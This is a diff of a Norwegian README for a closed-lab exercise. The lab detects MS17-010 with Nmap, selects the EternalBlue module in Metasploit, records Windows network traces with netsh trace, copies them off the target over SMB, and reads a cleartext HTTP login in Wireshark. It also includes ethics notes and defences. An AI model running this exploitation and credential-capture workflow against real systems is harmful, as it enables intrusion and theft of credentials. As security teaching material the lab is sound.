@@ -1,53 +1,52 @@
 # MS17-010 (EternalBlue) + nettverksspor — lab
 
-Fiktiv, lukket lab der jeg:
-1) påviser **MS17-010** (EternalBlue) mot en Windows-vert,
-2) demonstrerer exploit-flyten i Metasploit,
-3) samler **Windows nettverksspor** med `netsh trace`,
-4) eksporterer/konverterer sporet og verifiserer i **Wireshark** at en HTTP-innlogging er synlig i klartekst.
+Denne laben demonstrerer en helhetlig sikkerhetstest i et **lukket** miljø:
+1) identifikasjon av sårbar **SMBv1 / MS17-010**,  
+2) utnyttelse-flyt (funn → modulvalg → kjøring),  
+3) innsamling av **nettverksspor** på Windows med `netsh trace`,  
+4) eksport/konvertering til PCAP og **analyse i Wireshark** som viser en HTTP-innlogging i klartekst.
 
-> **Etikk:** Kun lab/demo i eget miljø. Ikke test mot systemer du ikke eier eller har eksplisitt tillatelse til. Sladd brukernavn/passord, tokens og interne IP-er før publisering.
-
----
-
-## Mål
-- Verifisere sårbar **SMBv1 / MS17-010** på målmaskin.
-- Vise exploit-arbeidsflyt (funn → modulvalg → kjøring) i Metasploit.
-- Samle og hente ut **nettverksspor** fra Windows (`.etl`) og konvertere til **pcap/pcapng**.
-- Dokumentere i **Wireshark** at HTTP-innlogging fanges når TLS ikke brukes.
-
-## Laboppsett (eksempel)
-- **Angriper:** Kali Linux  
-- **Mål:** Windows-vert med SMBv1 (sårbar for MS17-010)  
-- **Bruker-VM:** Windows-VM som besøker intern webapp  
-- **Verktøy:** Nmap, Metasploit, `netsh trace`, etl2pcapng, editcap, Wireshark
+> **Etikk:** Dette er kun en kontrollert demo i eget labnett. Ikke test mot systemer du ikke eier eller har eksplisitt tillatelse til. Maskér alltid sensitive verdier (brukernavn, passord, tokens, interne IP-er).
 
 ---
 
-## Kontekst
-**Angriper-IP**
+## Overblikk
+
+**Angriper (Kali) – IP**
 ![attacker ip](images/attacker-ip.png)
 
-**Webapp – landingsside**
+**Intern webapp – landingsside**
 ![web home](images/webapp-home.png)
 
-**Webapp – innlogget oversikt**
+**Intern webapp – innlogget oversikt**
 ![web messages](images/webapp-messages.png)
 
 **Windows (mål/klient) – oversikt**
 ![windows admin](images/windows-admin.png)
 
+### Mål med øvelsen
+- **Verifisere sårbarhet**: Påvise MS17-010 på målmaskinen.
+- **Utnytte kontrollert**: Demonstrere at sårbarheten kan gi kjøring/skall i lab.
+- **Fange bevis**: Samle Windows-nettverksspor (ETL), eksportere og konvertere til PCAP/PCAPNG.
+- **Analysere risiko**: Vise at en HTTP-pålogging kan leses i klartekst i Wireshark.
+
+### Miljø og verktøy
+- **Angriper**: Kali Linux  
+- **Mål/klient**: Windows med SMBv1 aktivert (sårbar for MS17-010)  
+- **Øvrig**: Windows-VM som besøker webappen
+- **Verktøy**: Nmap, Metasploit, `netsh trace`, etl2pcapng, editcap, Wireshark
+
 ---
 
-## A) Sårbarhet og utnyttelse
+## A) Kartlegging og sårbarhetsindikasjon
 
-**Nmap MS17-010 (NSE) – VULNERABLE**
+**Nmap MS17-010 (NSE) – sårbar vert oppdaget**
 ```bash
 nmap --script smb-vuln* -p 445 192.168.x.x
 ```
 ![nmap ms17-010](images/nmap-ms17-010.png)
 
-**Metasploit i gang + modulvalg**
+**Metasploit i gang + modulvalg (EternalBlue)**
 ```bash
 msfconsole
 search eternalblue
@@ -57,42 +56,43 @@ set RHOSTS 192.168.x.x
 ![msf banner](images/msfconsole-banner.png)  
 ![msf search](images/msf-search-eternalblue.png)
 
-
 ---
 
-## B) Nettverksspor på Windows (innebygd)
+## B) Innsamling av nettverksspor på Windows
 
-**Start sporing**
+**Start sporing med `netsh trace` (ETL)**
 ```cmd
 netsh trace start capture=yes tracefile=C:\50309\net_trc.etl level=verbose
 ```
 ![trace start](images/netsh-trace-start.png)
 
-**Stopp sporing**
+**Stopp og lagre sporet**
 ```cmd
 netsh trace stop
 ```
 ![trace stop](images/netsh-trace-stop.png)
 
+*Hvorfor `netsh trace`?* Det er innebygd i Windows og egner seg når du ikke kan installere Wireshark på målmaskinen. Det produserer en **.etl** som må konverteres før analyse i Wireshark.
+
 ---
 
-## C) Eksfil og konvertering
+## C) Hente ut og konvertere spor
 
-**Hent ut `.etl` fra Windows**
-- Eksempel via SMB fra Kali:
+**Eksfiltrer ETL-filen fra Windows**  
+(her via SMB fra Kali – andre sikre metoder fungerer også)
 ```bash
 smbclient //192.168.x.x/50309 -U Administrator
 get net_trc.etl
 ```
 ![trace exfil](images/trace-exfil.png)
 
-**Konverter `.etl` → `.pcapng` (Windows etl2pcapng)**
+**Konverter `.etl` → `.pcapng` (Windows)**
 ```powershell
 .\etl2pcapng.exe C:\...\net_trc.etl C:\...\net_trc.pcapng
 ```
 ![etl2pcapng](images/etl2pcapng-convert.png)
 
-**(Valgfritt) Konverter `.pcapng` → `.pcap` for kompatibilitet**
+**(Valgfritt) `.pcapng` → `.pcap` for kompatibilitet**
 ```bash
 editcap -F pcap ~/Desktop/net_trc.pcapng ~/Desktop/net_trc.pcap
 ```
@@ -102,20 +102,49 @@ editcap -F pcap ~/Desktop/net_trc.pcapng ~/Desktop/net_trc.pcap
 
 ## D) Analyse i Wireshark
 
-Filtrer på HTTP og finn POST-forespørsel som inneholder innloggingsdata (demo uten TLS):
+Filtrer på **HTTP** og finn POST-forespørselen. I denne labben går trafikken ukryptert (ingen TLS), og innloggingsdataene fremstår derfor i klartekst.
+
 ![wireshark creds](images/wireshark-credentials.png)
+
+**Leseguide:**
+- Øverst: HTTP-pakker (200/302/POST).  
+- Midt: *Hypertext Transfer Protocol*-panelet med POST-felter (brukernavn/pass).  
+- Høyre: hex-visning (ikke nødvendig å vise i klartekst dersom passord sladdes).
 
 ---
 
-## Hvorfor dette fungerer (kort)
-- **MS17-010 / EternalBlue** misbruker en sårbarhet i SMBv1 for fjernkodekjøring.  
-- `netsh trace` samler rå nettverkshendelser på Windows i `.etl`. Med **etl2pcapng** og **editcap** kan vi åpne sporet i **Wireshark** og observere **HTTP POST**-innhold når trafikken ikke er kryptert.
+## Hvorfor teknikken virker (kort forklaring)
 
-## Forsvar (kort)
-- Deaktiver **SMBv1** og patch **MS17-010**.  
-- Segmenter nettverk og begrens SMB til nødvendige soner.  
-- Tving **HTTPS**; benytt **EDR/IDS** og overvåk mistenkelig SMB-trafikk.  
-- Regelmessig sårbarhetsskanning og patchhygiene.
+- **MS17-010 / EternalBlue** utnytter en feil i **SMBv1** som muliggjør fjernkodekjøring.  
+- **`netsh trace`** fanger nettverks-I/O på verts-siden til en ETL. Med **etl2pcapng** (og ev. **editcap**) kan sporet åpnes i **Wireshark**.  
+- **HTTP uten TLS** innebærer at **brukernavn og passord** kan leses i klartekst i nettverkssporet.
+
+---
+
+## Forsvar og avbøtende tiltak
+
+**Host / OS**
+- Deaktiver **SMBv1** og patch **MS17-010** (oppdater OS).  
+- Begrens administrative delinger/tilganger; prinsippet om minste privilegium.
+
+**Nettverk**
+- Segmentér SMB til nødvendige soner; blokker uautorisert 445/tcp på tvers av segmenter.  
+- Overvåk signaturer/indikatorer relatert til EternalBlue.
+
+**Applikasjon / Bruker**
+- Tving **HTTPS** (TLS) for all pålogging.  
+- Innfør passordhygiene og MFA; detekter uvanlige innloggingsmønstre.
+
+---
+
+## Reproduser (høydenivå)
+
+1. Kartlegg SMB på mål, bekreft MS17-010-indikasjon (Nmap NSE).  
+2. Kjør en kontrollert utnyttelse i lab (Metasploit-flyt).  
+3. Start `netsh trace`, gjenskape en **legitim** brukerhandling (HTTP-login), stopp sporet.  
+4. Eksporter ETL, konverter til PCAP/PCAPNG, åpne i Wireshark og dokumentér funn.
+
+> **Tips:** Maskér sensitive verdier i skjermbilder før publisering av repoet.
 
 ## Lisens
 MIT
